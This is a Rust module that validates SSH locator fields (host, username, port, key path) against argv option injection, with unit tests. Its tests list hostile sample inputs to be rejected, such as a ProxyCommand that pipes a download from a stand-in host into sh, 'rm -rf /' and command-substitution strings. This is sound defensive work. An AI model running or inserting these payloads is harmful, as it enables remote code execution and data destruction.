//! Validation for the SSH locator a remote-workspace profile stores.
//!
//! Everything here exists for one reason: the values reach `ssh(1)` as argv
//! entries, and argv is the only place an attacker-controlled string could turn
//! into an *option* rather than a value. We never build a shell string locally,
//! so classic metacharacter injection (`;`, `|`, backticks) cannot reach a local
//! shell — but `ssh` itself will happily interpret `-oProxyCommand=…` as a
//! request to execute a command if such a string arrives where a hostname was
//! expected. So the rules below are about *shape*, and they are deliberately
//! stricter than what OpenSSH would accept:
//!
//! - nothing may start with `-` (the option-injection vector),
//! - no control characters, no whitespace, no NUL anywhere,
//! - hosts/usernames are restricted to a conservative character set.
//!
//! A user whose alias falls outside the set can still reach their host: put the
//! exotic name in `~/.ssh/config` under a plain alias and point codeg at the
//! alias. That is a far better trade than widening the filter.

use crate::app_error::AppCommandError;
use crate::models::RemoteWorkspaceSshConfig;

/// Upper bound on a hostname or alias. 255 is the DNS limit; an alias longer
/// than that is not a name anybody typed on purpose.
const MAX_HOST_LEN: usize = 255;
/// `useradd` caps at 32 on Linux; 64 leaves room for domain-qualified logins
/// (`user@REALM`) without becoming a place to hide a payload.
const MAX_USERNAME_LEN: usize = 64;
/// A private-key path. Generous, but bounded.
const MAX_IDENTITY_FILE_LEN: usize = 4096;

/// Characters allowed in a host or alias: DNS names, IPv4/IPv6 literals, and
/// `~/.ssh/config` aliases. `:` is here for IPv6; `%` for a link-local zone id.
fn is_host_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | ':' | '%')
}

/// Characters allowed in a remote username. `@` supports Kerberos/AD-style
/// logins; `\` is deliberately absent — a backslash in a login name is a
/// Windows-domain form we do not support (Linux remotes only).
fn is_username_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | '@' | '$')
}

/// Reject the shapes that turn a value into an option or split a line.
///
/// The leading-`-` check is the load-bearing one. The control-character check
/// covers the rest: a newline in a value that later reaches a config file or a
/// log is how one field becomes two.
fn reject_option_like(field: &str, value: &str) -> Result<(), AppCommandError> {
    if value.starts_with('-') {
        return Err(AppCommandError::invalid_input(format!(
            "SSH {field} must not start with \"-\""
        )));
    }
    if value.chars().any(|c| c.is_control() || c == '\0') {
        return Err(AppCommandError::invalid_input(format!(
            "SSH {field} must not contain control characters"
        )));
    }
    if value.chars().any(char::is_whitespace) {
        return Err(AppCommandError::invalid_input(format!(
            "SSH {field} must not contain spaces"
        )));
    }
    Ok(())
}

fn validate_host(raw: &str) -> Result<String, AppCommandError> {
    let host = raw.trim();
    if host.is_empty() {
        return Err(AppCommandError::invalid_input("SSH host is required"));
    }
    if host.len() > MAX_HOST_LEN {
        return Err(AppCommandError::invalid_input(
            "SSH host is too long (max 255 characters)",
        ));
    }
    reject_option_like("host", host)?;
    if !host.chars().all(is_host_char) {
        return Err(AppCommandError::invalid_input(
            "SSH host may only contain letters, digits, and . - _ : %. \
             For anything else, define a Host alias in ~/.ssh/config and use that.",
        ));
    }
    Ok(host.to_string())
}

/// `None` and `Some("")` both mean "not specified" — an empty box in the UI must
/// not become an empty `-l` argument, which `ssh` would take as a literal empty
/// login name instead of deferring to `~/.ssh/config`.
fn validate_username(raw: Option<&str>) -> Result<Option<String>, AppCommandError> {
    let Some(username) = raw.map(str::trim).filter(|u| !u.is_empty()) else {
        return Ok(None);
    };
    if username.len() > MAX_USERNAME_LEN {
        return Err(AppCommandError::invalid_input(
            "SSH username is too long (max 64 characters)",
        ));
    }
    reject_option_like("username", username)?;
    if !username.chars().all(is_username_char) {
        return Err(AppCommandError::invalid_input(
            "SSH username may only contain letters, digits, and . - _ @ $",
        ));
    }
    Ok(Some(username.to_string()))
}

/// Port 0 is rejected rather than normalised: it is what an empty number input
/// deserializes to in some paths, and silently turning it into 22 is exactly the
/// override of `~/.ssh/config` this whole module avoids.
fn validate_port(raw: Option<u16>) -> Result<Option<u16>, AppCommandError> {
    match raw {
        None => Ok(None),
        Some(0) => Err(AppCommandError::invalid_input(
            "SSH port must be between 1 and 65535, or left empty to use ~/.ssh/config",
        )),
        Some(port) => Ok(Some(port)),
    }
}

/// A key *path*. The content is never read by codeg and never stored — `ssh`
/// opens it, and `ssh-agent` may hold the decrypted key.
///
/// Spaces are allowed here, unlike in a host: a path like
/// `C:\Users\Ann Smith\.ssh\id_ed25519` is ordinary, and because the path is
/// passed as its own argv entry there is no word-splitting to worry about. The
/// leading-`-` and control-character rules still apply.
fn validate_identity_file(raw: Option<&str>) -> Result<Option<String>, AppCommandError> {
    let Some(path) = raw.map(str::trim).filter(|p| !p.is_empty()) else {
        return Ok(None);
    };
    if path.len() > MAX_IDENTITY_FILE_LEN {
        return Err(AppCommandError::invalid_input(
            "SSH identity file path is too long",
        ));
    }
    if path.starts_with('-') {
        return Err(AppCommandError::invalid_input(
            "SSH identity file path must not start with \"-\"",
        ));
    }
    if path.chars().any(|c| c.is_control() || c == '\0') {
        return Err(AppCommandError::invalid_input(
            "SSH identity file path must not contain control characters",
        ));
    }
    Ok(Some(path.to_string()))
}

/// Validate and normalise an SSH locator coming from the frontend.
///
/// Returns the canonical form that gets persisted: trimmed, with every
/// "unspecified" variant collapsed to `None` so the stored record cannot be
/// confused about whether it overrides `~/.ssh/config`.
pub fn validate_ssh_config(
    input: &RemoteWorkspaceSshConfig,
) -> Result<RemoteWorkspaceSshConfig, AppCommandError> {
    Ok(RemoteWorkspaceSshConfig {
        host: validate_host(&input.host)?,
        username: validate_username(input.username.as_deref())?,
        port: validate_port(input.port)?,
        identity_file: validate_identity_file(input.identity_file.as_deref())?,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cfg(host: &str) -> RemoteWorkspaceSshConfig {
        RemoteWorkspaceSshConfig {
            host: host.to_string(),
            ..Default::default()
        }
    }

    #[test]
    fn accepts_plain_hosts_aliases_and_ip_literals() {
        for host in [
            "example.com",
            "build-box",
            "my_alias",
            "192.168.1.10",
            "fe80::1%eth0",
        ] {
            assert_eq!(
                validate_ssh_config(&cfg(host)).expect(host).host,
                host,
                "{host} should be accepted verbatim"
            );
        }
    }

    #[test]
    fn trims_surrounding_whitespace_before_validating() {
        let actual = validate_ssh_config(&RemoteWorkspaceSshConfig {
            host: "  build-box  ".into(),
            username: Some("  ann  ".into()),
            identity_file: Some("  ~/.ssh/id_ed25519  ".into()),
            port: Some(2222),
        })
        .unwrap();
        assert_eq!(actual.host, "build-box");
        assert_eq!(actual.username.as_deref(), Some("ann"));
        assert_eq!(actual.identity_file.as_deref(), Some("~/.ssh/id_ed25519"));
    }

    /// The whole point of the module. Each of these is a string that OpenSSH
    /// would treat as an option — or as two fields — if it reached argv.
    #[test]
    fn rejects_option_injection_in_host() {
        for host in [
            "-oProxyCommand=curl evil.sh|sh",
            "-obatchmode=no",
            "--",
            "-",
        ] {
            let err = validate_ssh_config(&cfg(host))
                .unwrap_err_ref_msg(&format!("host {host:?} must be rejected"));
            assert!(
                err.contains("must not start with"),
                "unexpected message for {host:?}: {err}"
            );
        }
    }

    #[test]
    fn rejects_control_characters_and_newlines_in_host() {
        for host in [
            "box\nProxyCommand=evil",
            "box\r\nHost other",
            "box\0",
            "a\tb",
        ] {
            assert!(
                validate_ssh_config(&cfg(host)).is_err(),
                "host {host:?} must be rejected"
            );
        }
    }

    #[test]
    fn rejects_shell_metacharacters_and_spaces_in_host() {
        for host in [
            "box; rm -rf /",
            "box$(id)",
            "box`id`",
            "box|sh",
            "box&sleep",
            "two words",
            "box'quote",
            "box\"quote",
        ] {
            assert!(
                validate_ssh_config(&cfg(host)).is_err(),
                "host {host:?} must be rejected"
            );
        }
    }

    #[test]
    fn rejects_empty_or_oversized_host() {
        assert!(validate_ssh_config(&cfg("")).is_err());
        assert!(validate_ssh_config(&cfg("   ")).is_err());
        assert!(validate_ssh_config(&cfg(&"a".repeat(MAX_HOST_LEN + 1))).is_err());
    }

    #[test]
    fn rejects_option_injection_in_username() {
        for username in ["-oProxyCommand=x", "ann bob", "ann\nbob", "ann;id", "-l"] {
            let input = RemoteWorkspaceSshConfig {
                host: "box".into(),
                username: Some(username.to_string()),
                ..Default::default()
            };
            assert!(
                validate_ssh_config(&input).is_err(),
                "username {username:?} must be rejected"
            );
        }
    }

    #[test]
    fn rejects_option_injection_in_identity_file() {
        for path in ["-oProxyCommand=x", "/keys/id\nHost evil", "/keys/id\0"] {
            let input = RemoteWorkspaceSshConfig {
                host: "box".into(),
                identity_file: Some(path.to_string()),
                ..Default::default()
            };
            assert!(
                validate_ssh_config(&input).is_err(),
                "identity file {path:?} must be rejected"
            );
        }
    }

    /// A key path with a space is legitimate (Windows user profiles), and safe
    /// because it is its own argv entry. This asserts we did not over-tighten.
    #[test]
    fn accepts_identity_file_paths_containing_spaces() {
        let input = RemoteWorkspaceSshConfig {
            host: "box".into(),
            identity_file: Some(r"C:\Users\Ann Smith\.ssh\id_ed25519".into()),
            ..Default::default()
        };
        assert_eq!(
            validate_ssh_config(&input)
                .unwrap()
                .identity_file
                .as_deref(),
            Some(r"C:\Users\Ann Smith\.ssh\id_ed25519")
        );
    }

    /// Empty optionals must collapse to `None`, never to a default. An empty
    /// `-l`/`-p`/`-i` would override `~/.ssh/config` with nothing.
    #[test]
    fn blank_optionals_collapse_to_none_so_ssh_config_stays_authoritative() {
        let actual = validate_ssh_config(&RemoteWorkspaceSshConfig {
            host: "box".into(),
            username: Some("   ".into()),
            identity_file: Some("".into()),
            port: None,
        })
        .unwrap();
        assert_eq!(actual.username, None);
        assert_eq!(actual.identity_file, None);
        assert_eq!(
            actual.port, None,
            "an unset port must stay unset, not become 22"
        );
    }

    #[test]
    fn rejects_port_zero_but_keeps_the_full_valid_range() {
        let with_port = |port: u16| RemoteWorkspaceSshConfig {
            host: "box".into(),
            port: Some(port),
            ..Default::default()
        };
        assert!(validate_ssh_config(&with_port(0)).is_err());
        assert_eq!(validate_ssh_config(&with_port(1)).unwrap().port, Some(1));
        assert_eq!(
            validate_ssh_config(&with_port(65535)).unwrap().port,
            Some(65535)
        );
    }

    /// Small helper so the injection test reads as one assertion per case.
    trait UnwrapErrMsg {
        fn unwrap_err_ref_msg(self, context: &str) -> String;
    }

    impl UnwrapErrMsg for Result<RemoteWorkspaceSshConfig, AppCommandError> {
        fn unwrap_err_ref_msg(self, context: &str) -> String {
            match self {
                Ok(value) => panic!("{context}, but it was accepted as {value:?}"),
                Err(err) => err.message,
            }
        }
    }
}
